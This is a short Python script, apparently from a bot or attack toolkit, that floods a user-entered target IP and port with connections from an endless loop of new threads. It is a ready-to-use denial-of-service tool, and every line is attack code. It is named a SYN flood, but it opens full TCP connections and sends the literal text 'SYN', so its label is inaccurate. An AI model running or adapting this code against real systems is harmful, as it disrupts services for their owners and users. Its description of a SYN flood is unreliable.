# bots/syn_flood.py
import socket
from threading import Thread

def syn_flood(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
        s.send(b"SYN")
    except:
        pass
    s.close()

def start_syn():
    ip = input("[?] Target IP: ")
    port = int(input("[?] Port: "))
    print(f"[+] Starting SYN Flood on {ip}:{port}")
    while True:
        Thread(target=syn_flood, args=(ip, port)).start()
